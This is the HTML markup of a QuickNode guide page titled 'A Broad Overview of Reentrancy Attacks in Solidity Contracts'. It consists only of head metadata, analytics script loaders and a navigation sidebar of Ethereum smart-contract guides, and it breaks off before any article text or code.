<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts/index" data-theme="light" data-rh="lang,dir,class"><head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.3.1">
<title>A Broad Overview of Reentrancy Attacks in Solidity Contracts | QuickNode</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.quicknode.com/assets/marketing/og-images/guides-228f414862762eac2fbb465e3337f481e3b19e70203a91a337782566d4198297.png"><meta data-rh="true" name="twitter:image" content="https://www.quicknode.com/assets/marketing/og-images/guides-228f414862762eac2fbb465e3337f481e3b19e70203a91a337782566d4198297.png"><meta data-rh="true" property="og:url" content="https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="A Broad Overview of Reentrancy Attacks in Solidity Contracts | QuickNode"><meta data-rh="true" name="description" content="This quick guide gives a deep dive into everything you need to know about reentrancy manipulation."><meta data-rh="true" property="og:description" content="This quick guide gives a deep dive into everything you need to know about reentrancy manipulation."><link data-rh="true" rel="icon" href="/guides/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts"><link data-rh="true" rel="alternate" href="https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://KZ7P751D72-dsn.algolia.net" crossorigin="anonymous"><link rel="search" type="application/opensearchdescription+xml" title="QuickNode" href="/guides/opensearch.xml">
<script type="text/javascript" async="" src="https://cdn.pendo.io/agent/static/6fa9df0c-71c6-4547-42a4-50f41bebf129/pendo.js"></script><script type="text/javascript" async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://snap.licdn.com/li.lms-analytics/insight.min.js"></script><script type="text/javascript" async="" src="https://js.hs-analytics.net/analytics/1718453400000/21784639.js" id="hs-analytics"></script><script type="text/javascript" async="" src="https://s.adroll.com/j/roundtrip.js"></script><script type="text/javascript" async="" src="https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-58RP36F&amp;l=dataLayer"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/vendor/commons.a61d7bea37d2de5d4b69.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/vendor/commons.c42222c4cb2f8913500f.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-DYE4XLEMH3" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/pendo/1.1.4/pendo.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/linkedin-insight-tag/1.0.1/linkedin-insight-tag.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/hubspot/2.2.4/hubspot.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/facebook-pixel/2.11.5/facebook-pixel.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/adroll/2.2.1/adroll.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/google-tag-manager/2.5.1/google-tag-manager.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/integrations/mixpanel/3.2.1/mixpanel.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="https://cdn.segment.com/next-integrations/actions/google-analytics-4-web/1e02546c48aff8185544.js" async="" status="loaded"></script><script type="text/javascript" defer="" src="https://cdn.segment.com/analytics.js/v1/oUIVPubagx6VAoZCA5i6M19CWvTN5mTS/analytics.min.js"></script><script>!function(){var e=window.analytics=window.analytics||[];if(!e.initialize)if(e.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{e.invoked=!0,e.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"],e.factory=function(t){return function(){var a=Array.prototype.slice.call(arguments);return a.unshift(t),e.push(a),e}};for(var t=0;t<e.methods.length;t++){var a=e.methods[t];e[a]=e.factory(a)}e.load=function(t,a){var n=document.createElement("script");n.type="text/javascript",n.defer=!0,n.src="https://cdn.segment.com/analytics.js/v1/"+t+"/analytics.min.js";var o=document.getElementsByTagName("script")[0];o.parentNode.insertBefore(n,o),e._loadOptions=a},e._writeKey="oUIVPubagx6VAoZCA5i6M19CWvTN5mTS",e.SNIPPET_VERSION="4.15.2",e.load("oUIVPubagx6VAoZCA5i6M19CWvTN5mTS",{integrations:{Hotjar:Math.random()<.1}}),e.page()}}()</script><link rel="stylesheet" href="/guides/assets/css/styles.63a68f02.css">
<link rel="preload" href="/guides/assets/js/runtime~main.d2360be6.js" as="script">
<link rel="preload" href="/guides/assets/js/main.7eb23204.js" as="script">
<meta name="viewport" content="width=device-width, initial-scale=1.0" data-rh="true"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/bd3761d4.9c3b7833.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/f12f783e.9c992f75.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/3e7928a3.dbb4f941.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/7186097e.c5ad82bc.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/1d132ced.493e4b5f.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/339aaacd.a4958e6a.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/69e6530c.4f471fab.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/5b0d7a22.20d2bedb.js"><link rel="prefetch" href="/guides/assets/js/1df93b7f.cdfd86a3.js"><link rel="prefetch" href="/guides/assets/js/a7434565.fb07b4ae.js"><link rel="prefetch" href="/guides/assets/js/1be78505.f4665971.js"><link rel="prefetch" href="/guides/assets/js/247783bb.1966f557.js"><link rel="prefetch" href="/guides/assets/js/935f2afb.46291300.js"><link rel="prefetch" href="/guides/assets/js/17896441.c48e09c4.js"><link rel="prefetch" href="/guides/assets/js/475c22d7.c1d4f830.js"></head>
<body class="navigation-with-keyboard" style="overflow: visible;" data-rh="class">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top h-auto !p-0 border-b border-gray-200 shadow-none"><div class="flex flex-col w-full"><div class="navbar__inner py-4 px-4 md:px-6"><div class="navbar__items"><div class="flex justify-between w-full md:justify-start items-center"><a href="https://www.quicknode.com/" target="_self" rel="noopener noreferrer" class="navbar__brand"><div class="navbar__logo"><img src="/guides/img/logo.svg" alt="Quicknode Logo" class="themedImage_ToTc themedImage--light_HNdA"></div></a><div class="search !static searchBox_ZlJk"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key"><svg width="15" height="15" class="DocSearch-Control-Key-Icon"><path d="M4.505 4.496h2M5.505 5.496v5M8.216 4.496l.055 5.993M10 7.5c.333.333.5.667.5 1v2M12.326 4.5v5.996M8.384 4.496c1.674 0 2.116 0 2.116 1.5s-.442 1.5-2.116 1.5M3.205 9.303c-.09.448-.277 1.21-1.241 1.203C1 10.5.5 9.513.5 8V7c0-1.57.5-2.5 1.464-2.494.964.006 1.134.598 1.24 1.342M12.553 10.5h1.953" stroke-width="1.2" stroke="currentColor" fill="none" stroke-linecap="square"></path></svg></kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div></div></div><div class="navbar__items navbar__items--right"><div class="hidden md:flex"><div class="navbar__button__group flex items-center"><div><a class="btn-login mr-2 Button-module_button__peGiP button inline-flex justify-center text-center items-center transition duration-150 outline-0 Button-module_button--secondary__125or Button-module_button--md__B83Gc text-md" href="https://www.quicknode.com/login">Sign in</a><a class="Button-module_button__peGiP button inline-flex justify-center text-center items-center transition duration-150 outline-0 Button-module_button--primary__dZXuW Button-module_button--md__B83Gc text-md" href="https://www.quicknode.com/signup?utm_source=internal&amp;utm_campaign=guides&amp;utm_content=a-broad-overview-of-reentrancy-attacks-in-solidity-contracts">Create account</a></div></div></div><div class="ml-2"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn h-10 w-10 relative !mr-0" type="button"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 absolute"><path fill-rule="evenodd" clip-rule="evenodd" d="M3 3.5C3 3.22386 3.22386 3 3.5 3H10.5C10.7761 3 11 3.22386 11 3.5C11 3.77614 10.7761 4 10.5 4H3.5C3.22386 4 3 3.77614 3 3.5ZM3 6.5C3 6.22386 3.22386 6 3.5 6H12.5C12.7761 6 13 6.22386 13 6.5C13 6.77614 12.7761 7 12.5 7H3.5C3.22386 7 3 6.77614 3 6.5ZM3 9.5C3 9.22386 3.22386 9 3.5 9H10.5C10.7761 9 11 9.22386 11 9.5C11 9.77614 10.7761 10 10.5 10H3.5C3.22386 10 3 9.77614 3 9.5ZM3 12.5C3 12.2239 3.22386 12 3.5 12H11.5C11.7761 12 12 12.2239 12 12.5C12 12.7761 11.7761 13 11.5 13H3.5C3.22386 13 3 12.7761 3 12.5Z" fill="#58626D"></path></svg></button></div></div></div><div class="justify-between px-4 md:px-6 items-center w-full hidden md:flex"><div class="flex h-full"><a class="block border-b-2 cursor-pointer font-medium px-3 py-2 hover:no-underline text-md text-black border-b-blue-500" href="https://quicknode.com/guides/welcome">Guides</a><a class="block border-b-2 cursor-pointer font-medium px-3 py-2 hover:no-underline text-md text-faint border-b-transparent" href="https://quicknode.com/docs/welcome">API Documentation</a><a class="block border-b-2 cursor-pointer font-medium px-3 py-2 hover:no-underline text-md text-faint border-b-transparent" href="https://quicknode.com/courses/welcome">Courses</a><a class="block border-b-2 cursor-pointer font-medium px-3 py-2 hover:no-underline text-md text-faint border-b-transparent" href="https://quicknode.com/docs/changelog">Changelog</a><a class="block border-b-2 cursor-pointer font-medium px-3 py-2 hover:no-underline text-md text-faint border-b-transparent" href="https://www.youtube.com/@QuickNode" target="_blank" rel="noreferrer"><div class="flex items-center">Video Tutorials<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="ml-2 text-gray-700" data-name="external" type="system"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.5 4H6.49999C6.22385 4 5.99999 4.22386 5.99999 4.5C5.99999 4.77614 6.22385 5 6.49999 5H7.87867C8.76958 5 9.21574 6.07714 8.58578 6.70711L3.99999 11.2929C3.80473 11.4882 3.80473 11.8047 3.99999 12C4.19525 12.1953 4.51184 12.1953 4.7071 12L9.29289 7.41421C9.92285 6.78425 11 7.23042 11 8.12132V9.5C11 9.77614 11.2239 10 11.5 10C11.7761 10 12 9.77614 12 9.5V4.5C12 4.22386 11.7761 4 11.5 4Z" fill="currentColor"></path></svg></div></a></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_rpaz"><div class="sidebarViewport_YVHi"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/guides/welcome">Welcome</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Solana Development</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true">Ethereum Development</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">Getting Started</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">Wallets</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">Transactions</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">NFTs</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0">Smart Contracts</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-a-hello-world-smart-contract-with-solidity">Create a "Hello World" Smart Contract</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/an-overview-of-how-smart-contracts-work-on-ethereum">Overview of smart contracts on Ethereum</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/a-dive-into-evm-architecture-and-opcodes">EVM Architecture &amp; Opcodes Explained</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-and-deploy-a-smart-contract-with-hardhat">Create and Deploy a Smart Contract With Hardhat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-and-deploy-an-erc20-token">Create and Deploy an ERC20 Token</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/what-is-an-abi">What is an ABI?</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/the-web3-developer-stack">The Web3 Developer Stack</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-call-another-smart-contract-from-your-solidity-code">Call Another Smart Contract From Your Solidity Code</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts">Overview of Reentrancy Attacks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/an-introduction-to-upgradeable-smart-contracts">Intro to Upgradeable Smart Contracts</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/common-solidity-vulnerabilities-on-ethereum">Common Solidity Vulnerabilities on Ethereum</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/different-ways-to-verify-smart-contract-code">Different Ways to Verify Your Smart Contract Code</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-a-dutch-auction-smart-contract">Create a Dutch Auction Smart Contract</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-a-smart-contract-factory-in-solidity-using-hardhat">Create a Smart Contract Factory in Solidity using Hardhat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-a-soulbound-token">Create A Soulbound Token</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-and-deploy-an-erc404-token">Create and Deploy an ERC404 Token</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-and-deploy-an-upgradeable-erc20-token">Create and Deploy an Upgradeable ERC-20</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-and-deploy-an-upgradeable-smart-contract-using-openzeppelin-and-hardhat">Create and Deploy an Upgradeable Smart Contract</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-your-own-dao-with-aragon">Create Your Own DAO With Aragon</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-create-your-own-oracle-with-an-ethereum-smart-contract">Create Your Own Oracle</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-fork-ethereum-blockchain-with-foundry">Fork Ethereum Blockchain with Foundry</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-fork-ethereum-blockchain-with-ganache">Fork Ethereum Blockchain with Ganache</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-fork-ethereum-mainnet-with-hardhat">Fork Ethereum Blockchain with Hardhat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-get-the-balance-of-an-erc-20-token">Retrieve ERC-20 Token Balance</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-interact-with-smart-contracts">How To Interact with Smart Contracts</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-setup-local-development-environment-for-solidity/how-to-setup-local-development-environment-for-solidity">Setup Local Development Environment for Solidity</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-use-chainlink-vrf-in-your-smart-contract">Use Chainlink VRF in Your Smart Contract</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-use-create2-to-predetermine-contract-addresses">Use CREATE2 To Predict Contract Addresses</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-use-erc-4626-with-your-smart-contract">Use ERC-4626 with Your Smart Contract</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-use-keccak256-with-solidity">Use Keccak256 Hash Function with Solidity</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-write-a-secure-smart-contract-in-vyper">Create a Secure Smart Contract using Vyper</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-write-an-ethereum-smart-contract-using-solidity">Write an Ethereum Smart Contract Using Solidity</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/how-to-write-an-ethereum-smart-contract-using-vyper">Write an Ethereum Smart Contract Using Vyper</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/integrate-your-svelte-app-with-a-smart-contract">Integrate Your Svelte App with a Smart Contract</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/intro-to-foundry">Intro to Foundry</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/introduction-to-scaffold-eth">Introduction to Scaffold-ETH</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/solidity-vs-vyper">Solidity vs Vyper</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/the-diamond-standard-eip-2535-explained-part-1">EIP-2535 Explained - Part 1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/the-diamond-standard-eip-2535-explained-part-2">EIP-2535 Explained - Part 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/what-are-replay-attacks-on-ethereum">Replay Attacks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/what-is-ethereum-attestation-service-and-how-to-use-it">What is Ethereum Attestation Service (EAS)</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/what-is-hardhat">🎥  What is Hardhat?</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/guides/ethereum-development/smart-contracts/what-is-yul">What is Yul?</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">dApps</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">Staking</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0">MEV</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist 